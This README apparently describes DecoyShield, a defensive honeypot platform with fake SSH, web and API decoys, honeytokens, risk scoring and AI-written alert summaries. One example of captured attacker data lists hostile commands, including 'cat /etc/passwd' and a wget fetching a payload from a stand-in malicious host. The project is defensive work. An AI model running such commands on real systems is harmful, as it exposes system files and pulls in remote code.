# DecoyShield

> **Fake targets. Real protection.**

DecoyShield is an autonomous cyber deception platform that deploys fake servers, portals, APIs, and credentials across your infrastructure. The moment an attacker touches any decoy — DecoyShield captures everything, scores the threat, and fires an AI-generated alert instantly.

**Core principle:** Nobody should ever touch a honeypot. If they do, it matters.

---

## Table of Contents

- [What It Does](#what-it-does)
- [Features](#features)
- [Architecture](#architecture)
- [Tech Stack](#tech-stack)
- [Project Structure](#project-structure)
- [Honeypot Types](#honeypot-types)
- [Risk Scoring](#risk-scoring)
- [AI Summary Layer](#ai-summary-layer)
- [Alerting](#alerting)
- [MVP Roadmap](#mvp-roadmap)
- [Hosting — 100% Free](#hosting--100-free)
- [Getting Started](#getting-started)
- [Environment Variables](#environment-variables)
- [Contributing](#contributing)
- [License](#license)

---

## What It Does

Most security tools generate thousands of alerts. DecoyShield works differently.

Decoys are placed inside your infrastructure — fake SSH servers, fake admin portals, fake API endpoints, fake credentials. Real users never touch them. Attackers always do. Every interaction is a confirmed threat signal, not a false positive.

DecoyShield captures the attacker's IP, location, commands, payloads, and behavior pattern — then sends an AI-generated plain-English summary of exactly what happened and how serious it is.

---

## Features

### Honeypot Types
- **SSH Honeypot** — fake SSH server, captures brute force attempts, credentials tried, and commands executed
- **Web Login Honeypot** — fake admin portal, captures credential spray and reconnaissance
- **API Honeypot** — fake REST endpoints, captures enumeration and probing behavior
- **Honeytokens** — fake AWS keys, fake credentials, fake documents that trigger alerts on access

### Attack Intelligence
- Full IP geolocation (country, city, ISP) via ip-api.com
- Complete attack timeline from first probe to last action
- Commands executed and payloads captured
- Attacker fingerprinting via timing patterns and tool signatures

### Risk Scoring Engine

| Event | Score |
|---|---|
| Port scan | 20 |
| Login attempt | 40 |
| Credential spray | 70 |
| Command execution | 90 |
| Payload upload | 95 |

### AI Summary Layer
Instead of raw logs, you get plain English:

```
Source:    Russia (AS12345 — known malicious ASN)
Behavior:  Automated SSH brute force using Mirai variant signatures
Risk:      HIGH (92/100)
Action:    Block IP range, rotate SSH keys on real servers
```

### Dashboard (Next.js)
- Live attack feed
- Risk score cards per honeypot
- Threat timeline visualization
- AI report viewer
- Honeypot manager — deploy and stop decoys

### Alerting
- Discord webhook — instant notification on every hit
- Email notification
- In-dashboard live feed

---

## Architecture

```
Attacker / Scanner
        │
        ▼
┌─────────────────────────────────────────┐
│           Honeypot Network              │
│  SSH · Web Portal · Fake API · Tokens   │
│         (Oracle Cloud Free VM)          │
└──────────────────┬──────────────────────┘
                   │ events
                   ▼
┌─────────────────────────────────────────┐
│            Backend Engine               │
│  FastAPI · Supabase (PostgreSQL)        │
│                                         │
│  Event Store │ Risk Scoring             │
│  Geo + Intel │ AI Summary (Claude API)  │
└──────┬───────────────────────┬──────────┘
       │                       │
       ▼                       ▼
┌─────────────┐       ┌────────────────┐
│  Dashboard  │       │    Alerting    │
│  Next.js    │       │  Discord · Email│
│  Vercel     │       └────────────────┘
└─────────────┘
```

---

## Tech Stack

| Layer | Technology | Hosting |
|---|---|---|
| Frontend | Next.js 14 (App Router) | Vercel (free) |
| Backend | FastAPI (Python) | Render.com (free) |
| Database | PostgreSQL via Supabase | Supabase (free tier) |
| Auth | Supabase Auth | Supabase (free tier) |
| Honeypots | Python asyncio | Oracle Cloud Free VM |
| Geolocation | ip-api.com | Free, no API key |
| AI Summaries | Claude API (claude-sonnet-4-6) | Pay per use |
| Alerting | Discord Webhook + Email | Free |

**Total monthly cost: $0**

---

## Project Structure

```
decoyshield/
│
├── dashboard/                  # Next.js 14 frontend
│   ├── app/
│   │   ├── page.tsx            # Live attack feed
│   │   ├── honeypots/          # Honeypot manager
│   │   ├── timeline/           # Threat timeline
│   │   └── reports/            # AI report viewer
│   ├── components/
│   └── lib/
│       ├── supabase.ts
│       └── api.ts
│
├── backend/                    # FastAPI
│   ├── main.py
│   ├── routes/
│   │   ├── events.py           # Ingest attack events
│   │   ├── honeypots.py        # Manage honeypots
│   │   └── reports.py          # AI summaries
│   ├── services/
│   │   ├── scoring.py          # Risk scoring engine
│   │   ├── geo.py              # IP geolocation
│   │   ├── ai_summary.py       # Claude API integration
│   │   └── alerts.py           # Discord + email
│   └── models/
│       └── event.py
│
├── honeypots/                  # Deployed on Oracle VM
│   ├── ssh/
│   │   └── server.py           # Fake SSH server (asyncssh)
│   ├── web/
│   │   └── portal.py           # Fake admin login (FastAPI)
│   └── api/
│       └── fake_api.py         # Fake REST endpoints
│
├── supabase/
│   └── schema.sql              # Database schema
│
├── docker-compose.yml          # Local dev setup
├── .env.example
└── README.md
```

---

## Honeypot Types

### SSH Honeypot
A fake SSH server built with `asyncssh`. Accepts any connection, logs every credential attempt, and captures commands run in the fake shell session. Nothing is ever executed — everything is recorded.

### Web Login Honeypot
A fake admin portal served at a plausible URL (e.g. `/admin`, `/wp-admin`). Accepts any username/password combination and logs the attacker's IP, credentials tried, and browser fingerprint.

### API Honeypot
Fake REST endpoints that mimic common internal APIs. Logs every request path, method, headers, and body. Detects enumeration attempts, fuzzing tools, and directory traversal patterns.

### Honeytokens
Fake credentials and fake AWS keys distributed in plausible locations (config files, leaked repos, internal docs). When used, they trigger an instant alert. Zero false positives — if a honeytoken is used, a real breach has occurred.

---

## Risk Scoring

Every attack event is scored 0–100 based on behavior:

```python
SCORES = {
    "port_scan":          20,
    "login_attempt":      40,
    "credential_spray":   70,
    "command_execution":  90,
    "payload_upload":     95,
    "lateral_movement":   98,
}
```

Scores above 70 trigger immediate alerts. Scores above 90 trigger priority alerts with recommended actions.

---

## AI Summary Layer

DecoyShield sends captured attack data to the Claude API and returns a plain-English summary. No security expertise required to understand what happened.

**Input (raw event data):**
```json
{
  "ip": "185.220.101.45",
  "country": "Germany",
  "asn": "AS4134",
  "honeypot": "ssh",
  "commands": ["ls", "cat /etc/passwd", "wget http://malicious.site/payload.sh"],
  "duration_seconds": 142,
  "risk_score": 95
}
```

**Output (AI summary):**
```
Source:    Germany (AS4134 — Tor exit node)
Behavior:  Manual SSH session. Attacker ran recon commands then
           attempted to download a remote payload.
Risk:      CRITICAL (95/100)
Action:    Block IP immediately. Check real servers for similar
           activity. Rotate all SSH keys.
```

---

## Alerting

### Discord Webhook
Instant notification to your security channel on every honeypot hit. Includes risk score, source country, and AI summary.

### Email
Sent via SMTP for high-risk events (score ≥ 70). Includes full attack timeline and recommended actions.

### In-Dashboard Feed
Real-time feed visible in the dashboard. All events regardless of score.

---

## MVP Roadmap

### Phase 1 — Backend + Database (Day 1–2)
- [ ] FastAPI project setup
- [ ] Supabase schema (events, honeypots, alerts)
- [ ] Event ingestion API endpoint
- [ ] IP geolocation service

### Phase 2 — SSH Honeypot (Day 2–3)
- [ ] asyncssh fake server on Oracle VM
- [ ] Log credentials, commands, session duration
- [ ] POST events to backend API

### Phase 3 — Dashboard (Day 3–5)
- [ ] Next.js 14 project setup
- [ ] Live attack feed (Supabase realtime)
- [ ] Risk score cards
- [ ] Threat timeline

### Phase 4 — AI + Alerts (Day 5–6)
- [ ] Claude API integration for attack summaries
- [ ] Discord webhook alerts
- [ ] Email alerts for high-risk events

### Phase 5 — Web + API Honeypots (Day 6–7)
- [ ] Fake admin login portal
- [ ] Fake REST API endpoints
- [ ] Honeytoken generator

---

## Hosting — 100% Free

| Service | What it runs | Free limit |
|---|---|---|
| Oracle Cloud Free Tier | Honeypot VM (always-on) | 1 OCPU, 1GB RAM, forever free |
| Render.com | FastAPI backend | Free tier (spins down on idle) |
| Supabase | PostgreSQL + Auth | 500MB, 50k MAU |
| Vercel | Next.js dashboard | Unlimited personal projects |
| Discord | Webhook alerts | Free |
| ip-api.com | IP geolocation | 45 req/min, no key required |

---

## Getting Started

### Prerequisites
- Python 3.11+
- Node.js 20+
- Supabase account (free)
- Oracle Cloud account (free)
- Discord server with webhook URL

### 1. Clone the repo
```bash
git clone https://github.com/yourusername/decoyshield.git
cd decoyshield
```

### 2. Set up the database
```bash
# Run schema in your Supabase SQL editor
cat supabase/schema.sql
```

### 3. Start the backend
```bash
cd backend
pip install -r requirements.txt
cp .env.example .env
# Fill in your .env values
uvicorn main:app --reload
```

### 4. Start the dashboard
```bash
cd dashboard
npm install
cp .env.example .env.local
# Fill in your .env.local values
npm run dev
```

### 5. Deploy the SSH honeypot
```bash
# On your Oracle Cloud VM
cd honeypots/ssh
pip install asyncssh
python server.py
```

---

## Environment Variables

```env
# backend/.env

SUPABASE_URL=https://your-project.supabase.co
SUPABASE_SERVICE_KEY=your-service-role-key

ANTHROPIC_API_KEY=your-claude-api-key

DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/...

SMTP_HOST=smtp.gmail.com
SMTP_PORT=587
SMTP_USER=your@email.com
SMTP_PASS=your-app-password
ALERT_EMAIL=alerts@yourdomain.com
```

```env
# dashboard/.env.local

NEXT_PUBLIC_SUPABASE_URL=https://your-project.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=your-anon-key
NEXT_PUBLIC_API_URL=https://your-backend.onrender.com
```

---

## Contributing

Pull requests are welcome. For major changes, open an issue first to discuss what you'd like to change.

---

## License

MIT License. See [LICENSE](LICENSE) for details.

---

<p align="center">Built with Python · FastAPI · Next.js · Supabase · Claude API</p>